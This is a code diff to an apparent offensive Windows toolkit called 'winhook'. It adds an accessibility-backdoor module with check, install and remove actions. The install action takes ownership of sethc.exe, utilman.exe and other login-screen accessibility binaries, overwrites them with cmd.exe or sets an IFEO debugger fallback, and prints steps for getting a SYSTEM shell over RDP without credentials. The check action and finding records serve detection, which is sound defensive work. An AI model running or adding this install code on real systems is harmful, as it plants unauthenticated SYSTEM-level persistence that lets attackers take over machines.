@@ -23618,6 +23618,219 @@ Write-Output "[+] LmCompatibilityLevel restored to: $verify (NTLMv2 only)"
   return { output: output.join("\n"), findings }
 }
 
+async function accessibilityBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const target = argVal(args, "--target") || "sethc"
+  const payload = argVal(args, "--payload") || "cmd.exe"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Accessibility features backdoor...\n"]
+
+  const targets: Record<string, { exe: string; trigger: string }> = {
+    sethc: { exe: "sethc.exe", trigger: "Press Shift 5 times at login screen" },
+    utilman: { exe: "utilman.exe", trigger: "Press Win+U at login screen" },
+    narrator: { exe: "Narrator.exe", trigger: "Press Win+Enter at login screen" },
+    osk: { exe: "osk.exe", trigger: "Click On-Screen Keyboard from Ease of Access" },
+    magnify: { exe: "Magnify.exe", trigger: "Press Win+Plus at login screen" },
+  }
+
+  const t = targets[target]
+  if (!t) {
+    output.push(`ERROR: Unknown target '${target}'. Valid: ${Object.keys(targets).join(", ")}`)
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== Accessibility Backdoor Check ==="
+Write-Output ""
+
+$targets = @{
+  'sethc' = @{ Exe = 'sethc.exe'; Trigger = 'Shift x5' }
+  'utilman' = @{ Exe = 'utilman.exe'; Trigger = 'Win+U' }
+  'narrator' = @{ Exe = 'Narrator.exe'; Trigger = 'Win+Enter' }
+  'osk' = @{ Exe = 'osk.exe'; Trigger = 'On-Screen Keyboard' }
+  'magnify' = @{ Exe = 'Magnify.exe'; Trigger = 'Win+Plus' }
+}
+
+$backdoored = 0
+foreach ($name in $targets.Keys) {
+  $t = $targets[$name]
+  $path = "$env:SystemRoot\\System32\\$($t.Exe)"
+  if (Test-Path $path) {
+    $hash = (Get-FileHash $path -Algorithm MD5).Hash
+    $sig = (Get-AuthenticodeSignature $path -ErrorAction SilentlyContinue).Status
+    $size = (Get-Item $path).Length
+
+    # Check if it's been replaced (cmd.exe is ~302KB, sethc.exe is ~15KB)
+    $cmdHash = (Get-FileHash "$env:SystemRoot\\System32\\cmd.exe" -Algorithm MD5).Hash
+    $isCmd = $hash -eq $cmdHash
+
+    if ($isCmd) {
+      Write-Output "[!] $($t.Exe) — REPLACED with cmd.exe ($($t.Trigger))"
+      $backdoored++
+    } elseif ($sig -ne 'Valid') {
+      Write-Output "[!] $($t.Exe) — UNSIGNED (possibly replaced)"
+      $backdoored++
+    } else {
+      Write-Output "[*] $($t.Exe) — Original (signed, $($size) bytes)"
+    }
+
+    # Check for IFEO debugger
+    $ifeo = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$($t.Exe)" -Name Debugger -ErrorAction SilentlyContinue).Debugger
+    if ($ifeo) {
+      Write-Output "    [!] IFEO Debugger set: $ifeo"
+      $backdoored++
+    }
+  } else {
+    Write-Output "[-] $($t.Exe) — NOT FOUND"
+  }
+}
+Write-Output ""
+Write-Output "BACKDOORED=$backdoored"
+
+# Check if Credential Guard blocks this
+$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
+$cg = $dg -and ($dg.SecurityServicesRunning -contains 1)
+Write-Output ""
+Write-Output "Credential Guard: $(if ($cg) { 'ACTIVE — login screen credentials isolated, but SYSTEM shell still works' } else { 'NOT ACTIVE' })"
+
+# Check RDP status (needed for remote exploitation)
+$rdp = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -ErrorAction SilentlyContinue).fDenyTSConnections
+Write-Output "RDP: $(if ($rdp -eq 0) { 'ENABLED' } else { 'DISABLED' })"
+Write-Output "RDP_ENABLED=$(if ($rdp -eq 0) { '1' } else { '0' })"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const backdoored = r.stdout.match(/BACKDOORED=(\d+)/)
+    if (backdoored && parseInt(backdoored[1]) > 0) {
+      findings.push({
+        checkId: "WIN-ACC-001",
+        provider: "windows",
+        severity: "critical",
+        status: "BACKDOORED",
+        resource: "accessibility://login-screen",
+        title: `${backdoored[1]} accessibility backdoor(s) detected`,
+        details: "Accessibility executables have been replaced or have IFEO debuggers set. SYSTEM shell available at login screen.",
+        remediation: "Restore original files from C:\\Windows\\WinSxS or system image. Remove IFEO debugger entries.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    const script = `
+Write-Output "=== Installing Accessibility Backdoor ==="
+Write-Output "Target: ${t.exe}"
+Write-Output "Payload: ${payload}"
+Write-Output "Trigger: ${t.trigger}"
+Write-Output ""
+
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+  Write-Output "[-] Administrator privileges required"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+$targetPath = "$env:SystemRoot\\System32\\${t.exe}"
+$backupPath = "$env:SystemRoot\\System32\\${t.exe}.bak"
+
+# Backup original
+if (Test-Path $targetPath) {
+  if (-not (Test-Path $backupPath)) {
+    Copy-Item $targetPath $backupPath -Force
+    Write-Output "[+] Original backed up to: $backupPath"
+  } else {
+    Write-Output "[*] Backup already exists"
+  }
+}
+
+# Take ownership and replace
+try {
+  takeown /f $targetPath /a 2>&1 | Out-Null
+  icacls $targetPath /grant Administrators:F 2>&1 | Out-Null
+  Copy-Item "$env:SystemRoot\\System32\\${payload}" $targetPath -Force
+  Write-Output "[+] ${t.exe} replaced with ${payload}"
+  Write-Output ""
+  Write-Output "[+] Backdoor installed!"
+  Write-Output "[*] Trigger: ${t.trigger}"
+  Write-Output "[*] Result: SYSTEM shell at login screen"
+  Write-Output ""
+  Write-Output "[*] Remote usage:"
+  Write-Output "    1. RDP to target"
+  Write-Output "    2. At login screen: ${t.trigger}"
+  Write-Output "    3. SYSTEM cmd.exe opens"
+  Write-Output ""
+  Write-Output "Cleanup: winhook accessibility_backdoor --action remove --target ${target}"
+  Write-Output "STATUS=SUCCESS"
+} catch {
+  Write-Output "[-] Replace failed: $_"
+  Write-Output "[*] Try IFEO method instead:"
+  Write-Output "    reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}' /v Debugger /t REG_SZ /d '${payload}' /f"
+  Write-Output ""
+
+  # Fallback to IFEO
+  Write-Output "[*] Attempting IFEO debugger method..."
+  $ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}"
+  New-Item -Path $ifeoKey -Force | Out-Null
+  Set-ItemProperty $ifeoKey -Name Debugger -Value "$env:SystemRoot\\System32\\${payload}" -Type String
+  Write-Output "[+] IFEO debugger set: ${t.exe} -> ${payload}"
+  Write-Output "[*] When ${t.exe} launches, ${payload} runs instead"
+  Write-Output "STATUS=SUCCESS_IFEO"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS") || r.stdout.includes("STATUS=SUCCESS_IFEO")) {
+      findings.push({
+        checkId: "WIN-ACC-010",
+        provider: "windows",
+        severity: "critical",
+        status: "BACKDOORED",
+        resource: `accessibility://${target}`,
+        title: `Accessibility backdoor installed: ${t.exe} → ${payload}`,
+        details: `${t.trigger} at login screen now spawns ${payload} as SYSTEM.`,
+        remediation: `Remove: winhook accessibility_backdoor --action remove --target ${target}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const script = `
+Write-Output "=== Removing Accessibility Backdoor ==="
+
+$targetPath = "$env:SystemRoot\\System32\\${t.exe}"
+$backupPath = "$env:SystemRoot\\System32\\${t.exe}.bak"
+
+# Restore from backup
+if (Test-Path $backupPath) {
+  takeown /f $targetPath /a 2>&1 | Out-Null
+  icacls $targetPath /grant Administrators:F 2>&1 | Out-Null
+  Copy-Item $backupPath $targetPath -Force
+  Remove-Item $backupPath -Force
+  Write-Output "[+] Original ${t.exe} restored from backup"
+} else {
+  Write-Output "[*] No backup found — restore from C:\\Windows\\WinSxS manually"
+}
+
+# Remove IFEO debugger
+$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}"
+$debugger = (Get-ItemProperty $ifeoKey -Name Debugger -ErrorAction SilentlyContinue).Debugger
+if ($debugger) {
+  Remove-ItemProperty $ifeoKey -Name Debugger -Force
+  Write-Output "[+] IFEO debugger removed for ${t.exe}"
+}
+
+Write-Output "[+] Backdoor removed"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -27259,6 +27472,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   password_filter: passwordFilter,
   dsrm_abuse: dsrmAbuse,
   ntlmv1_downgrade: ntlmv1Downgrade,
+  accessibility_backdoor: accessibilityBackdoor,
 }
 
 export const WinhookTool = Tool.define("winhook", {
